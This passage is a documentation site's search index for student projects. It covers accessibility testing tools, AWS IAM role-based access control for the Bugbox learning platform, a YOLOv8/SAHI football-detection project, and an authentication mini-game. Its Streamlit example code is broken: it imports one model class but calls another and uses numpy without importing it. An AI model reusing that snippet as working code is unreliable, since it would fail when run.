Implementation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#introduction","content":" We will explore the various tools available for accessibility validation, which are essential in ensuring that digital platforms, like Bugbox, are accessible to all users, including those with disabilities. This includes both automated and manual tools, as well as the steps for using them to identify and address potential barriers to accessibility.  ","version":"Next","tagName":"h2"},{"title":"1. Automated Accessibility Testing Tools:​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#1-automated-accessibility-testing-tools","content":" Automated accessibility testing tools are a great first step in identifying common accessibility issues. While they cannot catch everything, they help pinpoint major problems like missing alt text, color contrast issues, and navigational challenges.  Here are some popular automated accessibility tools and steps to use them:  ","version":"Next","tagName":"h2"},{"title":"Google Lighthouse​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#google-lighthouse","content":" Google Lighthouse is a built-in tool in Google Chrome that provides audits for accessibility, performance, SEO, and other best practices. It generates an accessibility score and suggests improvements.  Steps to Use Google Lighthouse:  Open Google Chrome and press F12 (or Ctrl + Shift + I) to open Developer Tools. Go to the “Lighthouse” tab. Select “Accessibility” under the Audit category. Click “Generate Report” to run the audit and view suggestions for improvement.  ","version":"Next","tagName":"h3"},{"title":"WAVE​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#wave","content":" WAVE is a user-friendly tool that highlights accessibility issues in real time on webpages. It shows detailed feedback on issues such as missing alt text, structural problems, and color contrast.  Steps to Use WAVE:  Visit the WAVE website link to wave website and enter the URL of the webpage you want to test. Alternatively, you can install the WAVE browser extension to analyze pages in real-time. Review the report to identify the issues and follow the suggested fixes.  ","version":"Next","tagName":"h3"},{"title":"2. Manual Testing​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#2-manual-testing","content":" Although automated tools are a great start, manual testing is essential for finding more complex issues that may not be captured by these tools. Manual testing requires physically interacting with the website or app to ensure it is fully accessible.  Here are some key manual accessibility tests and how to perform them:  ","version":"Next","tagName":"h2"},{"title":"Keyboard Navigation​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#keyboard-navigation","content":" To ensure that a site is accessible to users who rely on keyboards instead of a mouse, test the website’s navigation using only the keyboard.  Steps for Keyboard Navigation:  Use the Tab key to navigate through all clickable elements (links, buttons, forms). Ensure each element can be activated using the Enter key, and modals or pop-ups can be closed with Esc. Check that focus indicators (such as highlighting) are visible as you tab between elements.  ","version":"Next","tagName":"h3"},{"title":"Screen Reader Testing​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#screen-reader-testing","content":" Screen readers are essential for visually impaired users. Testing a website with screen readers ensures that it is navigable and content is read aloud in a logical order.  Steps for Screen Reader Testing:  Use screen readers like VoiceOver (for macOS), TalkBack (for Android), or NVDA (for Windows). Navigate through the page and listen to how the content is read aloud. Ensure that the reading order makes sense, and that images and other non-text content are described by alternative text (alt text).  ","version":"Next","tagName":"h3"},{"title":"Color Contrast​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#color-contrast","content":" It is important to ensure that text has enough contrast against its background to be readable, especially for users with low vision.  Steps for Color Contrast Testing:  Use a tool like Adobe Color Contrast Analyser to check the contrast ratio between text and its background. Make sure that the contrast ratio meets the WCAG (Web Content Accessibility Guidelines) standards (at least 4.5:1 for normal text and 3:1 for large text).  ","version":"Next","tagName":"h3"},{"title":"User Testing with People with Disabilities​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#user-testing-with-people-with-disabilities","content":" The best way to ensure that a website or app is fully accessible is to test it with real users, particularly those with disabilities. They can provide direct feedback on their experience and highlight any issues that may have been missed.  ","version":"Next","tagName":"h2"},{"title":"Demonstration Example​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#demonstration-example","content":" Let’s do a quick run down of how Accessibility Validation tools can be used, using the bugbox site site  Using Lighthouse As we can see, the accessibility parameter is really good, and it satisfies most conditions. Using Lighthouse allows us to view what is non-compliant, and we can work to make the page better.    WAVE In my opinion, WAVE is a much better tool as it analyzes and shows exactly where the issue lies on the webpage.    Color Contrast Analyser We can check the color contrast of any section of the page by accessing the color from the styles section and checking it.    ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Accessibility Validation Tools and Their Implementation","url":"/redback-documentation/docs/project-5/Accessibility/validation-tools#conclusion","content":" Ensuring the accessibility of a digital platform, such as Bugbox, is essential for providing an inclusive and empowering learning experience for all users. By using a combination of automated testing tools, manual checks, and user testing, developers can identify and fix accessibility issues to create a more inclusive product. Regular testing and continuous improvements are necessary to maintain accessibility and ensure that all users, including those with disabilities, can fully engage with the platform. ","version":"Next","tagName":"h2"},{"title":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#introduction","content":" As Bugbox expands to offer an engaging and secure learning experience for young students, managing who can access what on the platform becomes very important. Role-Based Access Control (RBAC) is a security method that helps ensure users only have access to what they need based on their roles. Bugbox has chosen to use AWS Identity and Access Management (IAM) for RBAC, which makes managing user permissions easy, secure, and scalable. This document explains the benefits of using AWS for RBAC in Bugbox and how it helps manage user access securely.  ","version":"Next","tagName":"h2"},{"title":"Benefits of Using AWS for RBAC in Bugbox​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#benefits-of-using-aws-for-rbac-in-bugbox","content":" ","version":"Next","tagName":"h2"},{"title":"Centralized Access Management​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#centralized-access-management","content":" AWS IAM provides a single, central system to manage who can access what on Bugbox.  Bugbox can create roles with specific permissions to control what users can see and do. For example, teachers might have access to certain student data, while students only see their learning materials.  ","version":"Next","tagName":"h3"},{"title":"Scalability and Flexibility​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#scalability-and-flexibility","content":" As Bugbox grows, so does the need to manage more users and permissions. AWS IAM makes it easy to scale by allowing Bugbox to add new roles or permissions as needed.  If a user’s role changes, their permissions can be updated easily without needing to change the entire system.  ","version":"Next","tagName":"h3"},{"title":"Improved Security with Least Privilege​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#improved-security-with-least-privilege","content":" The principle of least privilege means users are only given the minimum access they need to do their job.  With IAM, Bugbox can create detailed policies to ensure users, like teachers or administrators, can only access what’s necessary for their role. For example, administrators can access everything, but teachers are restricted to data for their classes.  ","version":"Next","tagName":"h3"},{"title":"Easy Integration with Other AWS Services​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#easy-integration-with-other-aws-services","content":" AWS IAM allows Bugbox to manage permissions not just for its platform, but also for other services it uses, like data storage (Amazon S3) or databases (Amazon RDS).  This creates a unified, secure system for managing access to all resources across Bugbox’s platform and AWS services.  ","version":"Next","tagName":"h3"},{"title":"How Bugbox Is Implementing AWS for Role-Based Access Control​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#how-bugbox-is-implementing-aws-for-role-based-access-control","content":" ","version":"Next","tagName":"h2"},{"title":"Defining User Roles and Permissions​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#defining-user-roles-and-permissions","content":" Bugbox has created several key roles with specific permissions:  Administrators: Full access to everything on the platform.Educators/Teachers: Limited access to student data and tools for managing their classroom.Students: Only access to learning materials and assignments, but not any sensitive data.  These roles are set up in AWS IAM, ensuring users only have the permissions they need.  ","version":"Next","tagName":"h3"},{"title":"Creating Custom IAM Policies​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#creating-custom-iam-policies","content":" Bugbox uses IAM policies to define exactly what each role can do, such as which data or tools they can access.  For example, administrators can access the entire database, but teachers can only see the data related to their own students.  ","version":"Next","tagName":"h3"},{"title":"Using Tags for Resource Organization and Access Control​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#using-tags-for-resource-organization-and-access-control","content":" Bugbox also uses AWS tags to organize resources (like storage and databases) by labels, such as “Classroom:ClassA”.  Tags allow Bugbox to control access based on these labels. For example, only Students and Teachers from ClassA can access resources tagged as “Classroom:ClassA”.  This extra layer of control helps manage and monitor access easily.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"The Benefits of Using AWS for Role-Based Access Control (RBAC) in Bugbox","url":"/redback-documentation/docs/project-5/AWS/Benefits-of-AWS#conclusion","content":" By using AWS IAM for Role-Based Access Control (RBAC), Bugbox has created a secure and flexible system for managing who can access different parts of the platform. With IAM, Bugbox can give users the right amount of access, scale as the platform grows, and integrate with other AWS services. This approach ensures security, reduces risk, and provides a safe learning environment for both educators and students. As the platform continues to expand, Bugbox will be able to adjust access controls easily and efficiently. ","version":"Next","tagName":"h2"},{"title":"Small Object Detection: Football Tracking Project","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation","content":"","keywords":"","version":"Next"},{"title":"Project Overview​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#project-overview","content":" Small object detection, particularly for footballs, was a significant challenge in the tracking system due to their small size, rapid movement, and visual similarity to other objects like jerseys or field markings. To address this, the YOLOv8 architecture was enhanced with an additional convolutional head layer to detect objects as small as 4x4 pixels, improving ground-level football detection accuracy. A custom loss function was implemented to penalize misclassified bounding boxes, reducing false positives. SAHI (Slicing Aided Hyper Inference) further enhanced small object detection by focusing on localized regions but introduced latency, limiting real-time applicability. Frame interpolation techniques were also employed to improve detection continuity during rapid movements. These solutions provided robust football detection across diverse scenarios and video qualities.  ","version":"Next","tagName":"h2"},{"title":"Objectives​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#objectives","content":" ","version":"Next","tagName":"h2"},{"title":"Improve Our Models​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#improve-our-models","content":" Enhance the pose estimation model for sports-specific movements.Create a reliable player-tracking model using face detection.Optimize small object detection, particularly for tracking footballs in matches.  ","version":"Next","tagName":"h3"},{"title":"Research and Learning​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#research-and-learning","content":" Study the latest techniques in YOLOv8 and small object tracking.Test and train models on new datasets, focusing on improving accuracy in critical areas.  ","version":"Next","tagName":"h3"},{"title":"Efficient Data Storage and Access​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#efficient-data-storage-and-access","content":" Design a data storage system that is efficient and easy to search.Develop a user-friendly interface for quick access to specific information.  ","version":"Next","tagName":"h3"},{"title":"Custom Dataset Creation​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#custom-dataset-creation","content":" Manually annotated more than 1000 images of football matches.The dataset is exclusively focused on football detection to ensure a robust and targeted approach for small object detection.  ","version":"Next","tagName":"h3"},{"title":"YOLOv8 Research and Implementation​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#yolov8-research-and-implementation","content":" YOLOv8 was implemented and evaluated for small object detection.Key observations: High computational requirements due to YOLOv8’s complexity, affecting real-time applications.Latency issues, unsuitable for immediate feedback scenarios.Challenges with resource-constrained devices, such as IoT systems.  YOLOv8 Implementation Demonstration  ","version":"Next","tagName":"h3"},{"title":"SAHI Integration​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#sahi-integration","content":" Integrated SAHI (Slicing Aided Hyper Inference) with a patch size of 960x540.Improved detection accuracy for small objects but introduced delays, limiting production feasibility.  ","version":"Next","tagName":"h3"},{"title":"Custom Loss Function​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#custom-loss-function","content":" Developed a custom loss function to penalize misclassified bounding boxes.Reduced false positives (e.g., white jerseys misidentified as footballs).  # Example of the deviation penalty in the custom loss function deviation_penalty = 0.7   ","version":"Next","tagName":"h3"},{"title":"YOLOv8 Architecture Modification​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#yolov8-architecture-modification","content":" Added an extra convolutional head layer (kernel size 3x3) to detect objects as small as 4x4 pixels.Enhanced detection accuracy for surface-level footballs.  ","version":"Next","tagName":"h3"},{"title":"Video Frame Interpolation​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#video-frame-interpolation","content":" Applied interpolation techniques to address missing frames.Improved detection continuity and accuracy in video sequences.  ","version":"Next","tagName":"h3"},{"title":"Deployment and Visualization​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#deployment-and-visualization","content":" Deployed an interactive application using Streamlit to visually showcase the model’s performance.Users can input real-time data and view detection results through a visual interface.  ","version":"Next","tagName":"h3"},{"title":"Performance Analysis​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#performance-analysis","content":" The performance analysis revealed key insights into the challenges of deploying advanced detection models like YOLOv8 and SAHI in real-world scenarios:  Accuracy vs. Latency Tradeoff: SAHI significantly improves detection accuracy for small objects like footballs by slicing images into smaller patches.However, this improvement comes at a steep cost in terms of computational overhead and processing time. Execution Time Comparison: YOLOv8 alone processed the dataset in 123.77 seconds, demonstrating its efficiency for general object detection.When combined with SAHI, the execution time skyrocketed to 613.16 seconds, representing a fivefold increase.This drastic increase highlights the inefficiency of SAHI for real-time or resource-constrained environments. Resource Utilization: The additional computations required for slicing and processing with SAHI heavily taxed available resources.This resulted in higher memory usage, slower response times, and potential bottlenecks on devices with limited hardware capabilities. Production Feasibility: Given the significant processing delays, SAHI is not a viable option for production environments, especially for real-time sports analysis or IoT applications where quick feedback is critical.  Future work will focus on optimizing the pipeline to balance accuracy and execution time, possibly exploring alternative methods or hybrid approaches.  ","version":"Next","tagName":"h2"},{"title":"How to Use​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#how-to-use","content":" ","version":"Next","tagName":"h2"},{"title":"Requirements​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#requirements","content":" Python 3.8+Required libraries: torch, opencv-python, streamlit, sahi, numpy, matplotlib.  ","version":"Next","tagName":"h3"},{"title":"Instructions​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#instructions","content":" Clone the Repository: git clone https://github.com/your-repo/small-object-detection.git cd small-object-detection Install Dependencies: pip install -r requirements.txt Run the Streamlit App: streamlit run app.py View Results: Upload a video or image of a football match to see the detection results.  ","version":"Next","tagName":"h3"},{"title":"Open Issues​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#open-issues","content":" While SAHI improves small object detection accuracy, it significantly increases execution time. Execution time with YOLOv8 alone: 123.77 seconds.Execution time with YOLOv8 + SAHI: 613.16 seconds. This fivefold increase in processing time makes SAHI unsuitable for production environments, particularly for real-time applications or scenarios with limited computational resources.Further research and optimization are needed to balance accuracy and efficiency.  ","version":"Next","tagName":"h2"},{"title":"Contributors​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#contributors","content":" MD Tajish FarhanSahil Guglani  ","version":"Next","tagName":"h2"},{"title":"Example Code​","type":1,"pageTitle":"Small Object Detection: Football Tracking Project","url":"/redback-documentation/docs/project-4/Small_Object_Detection/Documentation#example-code","content":" import streamlit as st import cv2 from sahi.predict import get_sliced_prediction from sahi.model import Yolov8DetectionModel # Streamlit App Configuration st.title(&quot;Small Object Detection: Football Tracking&quot;) st.write(&quot;Upload an image or video to detect footballs.&quot;) # Upload File uploaded_file = st.file_uploader(&quot;Choose a file&quot;, type=[&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;mp4&quot;]) # Load YOLOv8 Model model_path = &quot;path_to_yolov8_model.pt&quot; detection_model = Yolov5DetectionModel( model_path=model_path, confidence_threshold=0.4, device=&quot;cpu&quot;, # Change to 'cuda' if GPU is available ) if uploaded_file is not None: # Check file type if uploaded_file.name.endswith((&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;)): # Image Processing file_bytes = np.asarray(bytearray(uploaded_file.read()), dtype=np.uint8) image = cv2.imdecode(file_bytes, 1) st.image(image, caption=&quot;Uploaded Image&quot;, use_column_width=True) # Object Detection result = get_sliced_prediction( image, detection_model, slice_height=540, slice_width=960 ) st.image(result.image, caption=&quot;Detection Result&quot;, use_column_width=True) elif uploaded_file.name.endswith(&quot;mp4&quot;): # Video Processing (Example: Placeholder for actual implementation) st.video(uploaded_file) st.write(&quot;Video detection functionality coming soon!&quot;) else: st.error(&quot;Unsupported file format.&quot;) st.write(&quot;Powered by YOLOv8 and SAHI.&quot;)  ","version":"Next","tagName":"h2"},{"title":"Implementing Role-Based Access Control (RBAC) with IAM and S3 in AWS","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/AWS/Implementing-AWS","content":"","keywords":"","version":"Next"},{"title":"Introduction to AWS IAM and S3​","type":1,"pageTitle":"Implementing Role-Based Access Control (RBAC) with IAM and S3 in AWS","url":"/redback-documentation/docs/project-5/AWS/Implementing-AWS#introduction-to-aws-iam-and-s3","content":" Amazon Web Services (AWS) offers a comprehensive set of cloud tools that help businesses manage their data and operations securely. Two important services for Bugbox are Identity and Access Management (IAM) and Simple Storage Service (S3).  IAM allows Bugbox to manage who can access which parts of the platform and what they can do with those resources. It helps administrators set up users, assign roles, and create permissions to make sure that people only have access to what they need. S3 is a cloud storage service where Bugbox can safely store educational materials, student assignments, and other important data.  Together, IAM and S3 help Bugbox implement Role-Based Access Control (RBAC). This system makes sure users can only access resources based on their roles, helping keep the platform secure and compliant with privacy rules like GDPR and FERPA.  ","version":"Next","tagName":"h2"},{"title":"Understanding Role-Based Access Control (RBAC)​","type":1,"pageTitle":"Implementing Role-Based Access Control (RBAC) with IAM and S3 in AWS","url":"/redback-documentation/docs/project-5/AWS/Implementing-AWS#understanding-role-based-access-control-rbac","content":" RBAC is a system that controls who can access which resources based on their job role. This ensures that people only have access to what’s needed for their work, reducing the risk of sensitive information being exposed.  RBAC involves two main parts:  Roles: These represent job responsibilities. Examples include Administrator, Educator, and Student.Permissions: These define what users can do, such as CRUD (Create, Read, Update and Delete).  In Bugbox:  An Administrator can manage the entire platform, including user roles and data.An Educator can view student assignments and upload lesson plans, student feedbacks but can't change system settings.A Student can only view and submit their own assignments.  RBAC helps Bugbox ensure that users only have access to the parts of the platform that are relevant to their role.  ","version":"Next","tagName":"h2"},{"title":"How IAM is implemented in Bugbox​","type":1,"pageTitle":"Implementing Role-Based Access Control (RBAC) with IAM and S3 in AWS","url":"/redback-documentation/docs/project-5/AWS/Implementing-AWS#how-iam-is-implemented-in-bugbox","content":" In Bugbox, IAM is used to create and manage users, assign roles, and control access to resources. It allows administrators to define specific user accounts for various roles, such as administrators, educators, and students. Each user is assigned a role that determines their level of access and the actions they can perform within Bugbox. These roles are linked to IAM policies, which define the permissions granted to the user. To implement this, Bugbox uses inline policies to assign specific permissions to users.  ","version":"Next","tagName":"h2"},{"title":"S3 for RBAC at Bugbox​","type":1,"pageTitle":"Implementing Role-Based Access Control (RBAC) with IAM and S3 in AWS","url":"/redback-documentation/docs/project-5/AWS/Implementing-AWS#s3-for-rbac-at-bugbox","content":" S3 is where Bugbox stores most of its static data, and by using IAM, Bugbox controls user access to specific files. CRUD (Create, Read, Update, Delete) permissions manage access to data: administrators can fully manage files in the bugboxresourcesmain bucket, educators can read and upload content but cannot delete it, and students can only submit assignments without the ability to delete other users' files. By combining IAM's permission system with S3’s storage controls, Bugbox ensures secure, role-based access to data.  ","version":"Next","tagName":"h2"},{"title":"Sample Policy for Student Role​","type":1,"pageTitle":"Implementing Role-Based Access Control (RBAC) with IAM and S3 in AWS","url":"/redback-documentation/docs/project-5/AWS/Implementing-AWS#sample-policy-for-student-role","content":" The following IAM policy provides write access to a Student role, specifically allowing them to upload student assignments to the bugboxresourcesmain S3 bucket under the Students/assignments/StudentUser folder.  { &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: [ &quot;s3:PutObject&quot; ], &quot;Resource&quot;: [ &quot;arn:aws:s3:::bugboxresourcesmain/Students/assignments/$(aws.username)/*&quot; ] } ] }  ","version":"Next","tagName":"h2"},{"title":"2-step Authentication","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/authentication-game","content":"","keywords":"","version":"Next"},{"title":"Avatar Creation Progress​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#avatar-creation-progress","content":" I was tasked by Dylan, my mentor, to create avatars for the drag-and-drop game, with the goal of bringing a robotic feel to the characters while maintaining the design integrity of the AI-generated images provided. Dylan had initially created an AI image that served as the starting point, offering the basic shapes and design language. My role was to adapt these forms, adding mechanical elements and enhancing them with shading and texture to give them a more dynamic, industrial look.  Using Procreate, I took the AI-generated avatars and reimagined them with a robotic twist, ensuring that each model had distinct features while staying true to the game's futuristic aesthetic. One of the major focuses was on texturing and shading, which played a crucial role in making the avatars appear more three-dimensional and lifelike. These techniques helped bring a sense of depth and tactile realism to the designs, which will enhance the player’s overall experience.  In addition to designing the avatars, I also created the backing slots where the avatars will snap into place within the game. These backing slots are essential for providing clear visual cues to players about where to place the avatars, ensuring a smooth drag-and-drop experience. The backing slots are designed to complement the robotic aesthetic of the avatars, using similar color schemes and textures to keep the game's interface consistent. These slots are not only functional but also add to the overall immersive feel of the game.  You can see a timelapse of my work, showcasing the development of these avatars in Procreate, via the following link: https://youtu.be/IF8CXxdNBWU  ","version":"Next","tagName":"h2"},{"title":"Images​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#images","content":" ","version":"Next","tagName":"h2"},{"title":"Geo - Blue Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#geo---blue-robot","content":" Designed with a friendly and approachable appearance, the blue robot features a smiling expression, making it more appealing to children. The use of a generic, vibrant blue color enhances its broad appeal, creating a character that feels safe and inviting for younger audiences.    ","version":"Next","tagName":"h3"},{"title":"Toast - Orange Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#toast---orange-robot","content":" The orange robot has a more rustic and edgy design, highlighted by its slightly mischievous grin. The color palette was chosen to give it a rugged look, which contrasts with the other characters, giving it a unique personality that might resonate with those who enjoy a more playful and less conventional character.    ","version":"Next","tagName":"h3"},{"title":"Tally - Beige Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#tally---beige-robot","content":" This robot has a cutesy, rounded form, with wide, expressive features. The two-tone color scheme softens its appearance, making it a more comforting and approachable character. Its design is meant to appeal to users who favor warmth and familiarity.    ","version":"Next","tagName":"h3"},{"title":"Chim - Green Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#chim---green-robot","content":" With a more 3D appearance, the green robot stands out due to its distinctive pattern and structural design. The texture gives it depth, and its geometric shape makes it feel more modern and mechanical, attracting users who appreciate a more complex, detailed look.    ","version":"Next","tagName":"h3"},{"title":"Zappy - Purple Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#zappy---purple-robot","content":" This character has a goofy and playful design, with exaggerated features like its wide mouth and antenna-like shapes. The use of purple makes it more whimsical, creating an energetic and fun character that can appeal to users who enjoy more lighthearted and quirky designs.    ","version":"Next","tagName":"h3"},{"title":"Squeak - Yellow Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#squeak---yellow-robot","content":" The yellow robot radiates cheerfulness with its rounded form and lively expression. Its simple and vibrant design, highlighted by soft pigtails, makes it highly approachable for younger audiences. The character exudes energy and joy, appealing to those who enjoy playful and lighthearted themes.    ","version":"Next","tagName":"h3"},{"title":"Chopper - Pink Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#chopper---pink-robot","content":" The pink robot is designed to resemble an octopus, blending marine-inspired elements with a playful robotic style. Its spherical body and tentacle-like base give it a soft yet dynamic look, while the propeller on top adds a whimsical touch. The textured shading and blush tones enhance its charm, making it a delightful character for users who enjoy unique and adorable designs.    ","version":"Next","tagName":"h3"},{"title":"Grumpy - Red Robot​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#grumpy---red-robot","content":" The red robot takes inspiration from a crab, with its angular, shell-like design and claw-like arms. Its tank-like body and claw-like features bring a sense of strength and resilience, while the sharp angles and deep red tones emphasize its assertive personality. Despite its tough exterior, the playful design ensures it remains engaging and fun for all users..    Together, all the characters are designed to cater to different tastes and preferences, ensuring that there is a robot for everyone.    ","version":"Next","tagName":"h3"},{"title":"Figma Prototyping​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#figma-prototyping","content":" After finalizing the avatars, I transitioned to Figma, where I built a working prototype of the drag-and-drop game. This allowed me to combine both the visual assets and the game's functionality into a cohesive prototype that aligns with the overall concept. The prototype simulates how the avatars will interact with the game mechanics, providing a clear representation of the final user experience.  You can explore the development of the game through the following Figma links:  tip To trial or play the actual drag and drop game, click on the Prototype Mode!! If you don't know where to click, click on the page randomly and options will pop up for you.  Development mode  Prototype mode  This entire process, from adapting AI-based designs to implementing them into a functional game prototype, marks significant progress toward the final version of the game.    ","version":"Next","tagName":"h2"},{"title":"Gameplay​","type":1,"pageTitle":"2-step Authentication","url":"/redback-documentation/docs/project-5/authentication-game#gameplay","content":" Here’s a step-by-step breakdown of how the authentication game works:    1. Starting the Game (Frame 8 - Homepage)  The game begins on the homepage of the BugBox website.The user is prompted to click the &quot;Code&quot; button, which turns orange when hovered over.  2. Launching the Mini-Game  Once the button is clicked, the mini-game starts.Proposed Randomization Feature: Each time the mini-game starts, we want the positions of the avatar slots are randomized to ensure that the game is different every time the user plays. This is not apparent in the prototype.    3. Playing the Mini-Game  The user sees a set of three avatars and their corresponding slots.The goal is to drag each avatar into the correct slot.  info Correct Move: If the user drags an avatar into the correct slot, the game advances to the next frame (Frame 2 → Frame 3 → Frame 4).   danger Wrong Move: If an avatar is placed in the wrong slot, the game will prompt the user to restart (Frame 7).    4. Completing the Mini-Game  Once all three avatars are placed correctly, the game reaches the final frame (Frame 5).The user is prompted to click the &quot;Go Play&quot; button.    5. Login Page  After clicking &quot;Go Play,&quot; the user is directed to the login page (previously at the start of the game).The user generates their credentials to log in.    6. Accessing the Code Playground  After logging in, the user clicks &quot;Go Play&quot; again.The user is then taken to Frame 6, which is the BugBox code playground.    This structure ensures that the game is played first, adding an interactive layer to the login process, as suggested by Dylan. ","version":"Next","tagName":"h3"},{"title":"Bugbox’s Role Based Access Control Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation","content":"","keywords":"","version":"Next"},{"title":"Purpose​","type":1,"pageTitle":"Bugbox’s Role Based Access Control Guide","url":"/redback-documentation/docs/project-5/AWS/RBAC-Documentation#purpose","content":" The purpose of this document is to provide guidance on implementing Role-Based Access Control (RBAC) in Bugbox. By defining clear roles, responsibilities, and permissions, Bugbox ensures that users have appropriate access to resources based on their job functions, while protecting sensitive data and streamlining administrative tasks.  ","version":"Next","tagName":"h2"},{"title":"Scope​","type":1,"pageTitle":"Bugbox’s Role Based Access Control 